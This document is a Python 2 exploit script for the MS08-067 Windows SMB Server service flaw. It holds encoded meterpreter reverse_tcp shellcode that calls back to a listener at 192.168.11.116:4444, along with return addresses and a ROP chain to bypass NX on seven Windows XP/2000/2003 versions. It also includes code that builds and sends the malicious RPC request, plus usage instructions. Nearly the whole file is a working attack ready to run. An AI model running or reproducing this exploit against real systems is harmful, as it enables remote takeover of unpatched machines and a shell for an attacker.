import struct
import time
import sys
import subprocess
import re

from threading import Thread    #Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    from impacket import dcerpc
    from impacket.dcerpc.v5 import transport
except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
    sys.exit(1)

print '#######################################################################'
print '#   MS08-067 Exploit'
print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
print '#'
print '#   Extended and modified by Erwin Wildenburg'
print '#######################################################################\n'

nopsled = "\x90" * 30

# windows/meterpreter/reverse_tcp - 380 bytes (stage 1)
# http://www.metasploit.com
# Encoder: x86/call4_dword_xor
# VERBOSE=false, LHOST=192.168.11.116, LPORT=4444, 
# ReverseAllowProxy=false, ReverseConnectRetries=5, 
# ReverseListenerThreaded=false, PayloadUUIDTracking=false, 
# EnableStageEncoding=false, StageEncoderSaveRegisters=, 
# StageEncodingFallback=true, PrependMigrate=false, 
# EXITFUNC=thread, AutoLoadStdapi=true, 
# AutoVerifySession=true, AutoVerifySessionTimeout=30, 
# InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
# EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
# SessionRetryWait=10, SessionExpirationTimeout=604800, 
# SessionCommunicationTimeout=300
buf =  ""
buf += "\x31\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xd8\x8b\x56\x8f\x83\xee\xfc\xe2\xf4\xe9\x42"
buf += "\xd5\x66\x75\x63\xa9\x70\x27\x74\x96\xd1\x59\xfd\x58"
buf += "\xde\x19\x61\xd2\x0c\x36\x77\xb4\x7b\xa2\x83\x3f\xe2"
buf += "\x3a\xa2\x43\xf4\x76\xb5\x7c\x55\x08\x3c\xb2\xc8\x08"
buf += "\xc0\x96\x88\x67\xb6\x5e\xff\x61\x02\xb5\xc8\xf3\x23"
buf += "\xc9\xde\xb5\x34\xf6\x7f\xcb\xbd\x38\x22\x70\x79\xab"
buf += "\xa2\xa4\x37\xd4\xd5\xb5\x19\x06\xbc\x49\xf1\xe4\x35"
buf += "\xac\xc0\x44\xd8\xc2\xa1\xb4\x37\x1b\xfd\x0f\xee\x5d"
buf += "\x7a\xf6\x94\x46\x46\xce\x9a\x78\x0e\x28\x80\x28\x8d"
buf += "\x86\x90\x69\x30\x4b\xb1\x48\x36\x66\x4e\x1b\xa6\x0f"
buf += "\xee\x59\x7a\xce\x80\xc2\xbd\x95\xc4\xaa\xb9\x85\x6d"
buf += "\x18\x7a\xdd\x9c\x48\x22\x0f\xf5\x51\x12\xbe\xf5\xc2"
buf += "\xc5\x0f\xbd\x9f\xc0\x7b\x10\x88\x3e\x89\xbd\x8e\xc9"
buf += "\x64\xc9\xbf\xf2\xf9\x44\x72\x8c\xa0\xc9\xad\xa9\x0f"
buf += "\xe4\x6d\xf0\x57\xda\xc2\xfd\xcf\x37\x11\xed\x85\x6f"
buf += "\xc2\xf5\x0f\xbd\x99\x78\xc0\x98\x6d\xaa\xdf\xdd\x10"
buf += "\xab\xd5\x43\xa9\xae\xdb\xe6\xc2\xe3\x6f\x31\x14\x99"
buf += "\xb7\x8e\x49\xf1\xec\xcb\x3a\xc3\xdb\xe8\x21\xbd\xf3"
buf += "\x9a\x4e\x0e\x51\x04\xd9\xf0\x84\xbc\x60\x35\xd0\xec"
buf += "\x21\xd8\x04\xd7\x49\x0e\x51\xd6\x4c\x99\x44\x14\x42"
buf += "\x85\xec\xbe\x49\xe0\xd8\x35\xaf\xa1\xd4\xec\x19\xb1"
buf += "\xd4\xfc\x19\x99\x6e\xb3\x96\x11\x7b\x69\xde\x9b\x94"
buf += "\xea\x1e\x99\x1d\x19\x3d\x90\x7b\x69\xcc\x31\xf0\xb0"
buf += "\xb6\xbf\x8c\xc9\xa5\x99\x74\x09\xeb\xa7\x7b\x69\x23"
buf += "\xf1\xee\xb8\x1f\xa6\xec\xbe\x90\x39\xdb\x43\x9c\x7a"
buf += "\xb2\xd6\x09\x99\x84\xac\x49\xf1\xd2\xd6\x49\x99\xdc"
buf += "\x18\x1a\x14\x7b\x69\xda\xa2\xee\xbc\x1f\xa2\xd3\xd4"
buf += "\x4b\x28\x4c\xe3\xb6\x24\x85\x7f\x60\x37\xf1\x52\x8a"
buf += "\xf1\x84\xbc"

nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()
        self.__port   = port
        self.target   = target
	self.os	      = os

    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)

	print '[-]Initiating connection'
        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + nopsled + buf +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2
        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"
        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'

if __name__ == '__main__':
	try:
		target = sys.argv[1]
		os = sys.argv[2]
	except IndexError:
		print 'Usage: %s <ip> <target>' % sys.argv[0]
		print 'Example: %s 192.168.1.100 6\n' % sys.argv[0]

		print 'Targets:'
		print '[1] Windows XP SP0/SP1 Universal'
		print '[2] Windows 2000 Universal'
		print '[3] Windows 2003 SP0 Universal'
		print '[4] Windows 2003 SP1 English'
		print '[5] Windows XP SP3 French (NX)'
		print '[6] Windows XP SP3 English (NX)'
		print '[7] Windows XP SP3 English (AlwaysOn NX)'

		sys.exit(-1)

current = SRVSVC_Exploit(target, os)
current.start()
